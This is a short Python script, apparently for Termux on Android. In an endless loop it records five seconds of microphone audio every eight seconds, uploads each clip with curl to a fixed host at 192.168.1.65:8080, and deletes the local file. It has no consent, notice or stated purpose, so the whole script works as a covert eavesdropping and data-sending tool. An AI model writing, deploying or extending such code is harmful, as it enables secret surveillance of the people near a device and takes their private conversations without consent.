import os, time, threading

def setInterval(func,time):
    e = threading.Event()
    while not e.wait(time):
        func()

def rec():
  # Записывание микрофона в аудиофайл (audio.wav) (5 с)
  os.system('termux-microphone-record -f audio.wav -l 5')
  time.sleep(6)

  os.system('curl -X POST -F "file=@audio.wav" http://192.168.1.65:8080')
  os.system('rm audio.wav')

setInterval(rec, 8)
